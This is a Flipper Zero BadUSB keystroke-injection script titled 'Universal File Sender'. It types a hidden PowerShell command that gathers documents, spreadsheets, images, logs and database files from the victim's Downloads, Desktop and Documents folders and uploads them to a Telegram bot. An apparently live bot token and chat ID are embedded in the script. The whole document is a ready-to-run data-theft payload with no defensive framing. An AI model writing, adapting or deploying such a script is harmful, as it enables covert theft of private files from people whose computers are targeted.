REM Flipper Zero - Universal File Sender
REM Sends ALL files from user folders

DELAY 4000
GUI r
DELAY 800
STRING powershell -NoP -W H -Exec B -C "
# Configuration
`$BOT = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
`$CHAT = '6614794141'

# Start message
curl.exe `"https://api.telegram.org/bot`$BOT/sendMessage?chat_id=`$CHAT&text=Starting+file+collection`"

# Scan and send files from key locations
`$LOCATIONS = @(
    `$env:USERPROFILE + '\\Downloads',
    `$env:USERPROFILE + '\\Desktop',
    `$env:USERPROFILE + '\\Documents'
)

`$SENT = 0

foreach (`$LOC in `$LOCATIONS) {
    if (Test-Path `$LOC) {
        # Get first 5 files of each common type
        `$FILES = Get-ChildItem -Path `$LOC -Include '*.txt','*.pdf','*.doc','*.docx','*.xls','*.xlsx','*.jpg','*.png','*.log','*.db' `
                 -File -ErrorAction SilentlyContinue -Depth 1 | Select-Object -First 5
        
        foreach (`$FILE in `$FILES) {
            if (`$FILE.Length -lt 20MB) {
                curl.exe -F `"chat_id=`$CHAT`" -F `"document=@`$(`$FILE.FullName)`" `"https://api.telegram.org/bot`$BOT/sendDocument`"
                `$SENT++
                Start-Sleep -Seconds 1
            }
        }
    }
}

# Completion message
curl.exe `"https://api.telegram.org/bot`$BOT/sendMessage?chat_id=`$CHAT&text=Completed.+Sent+`$SENT+files`"
"
ENTER
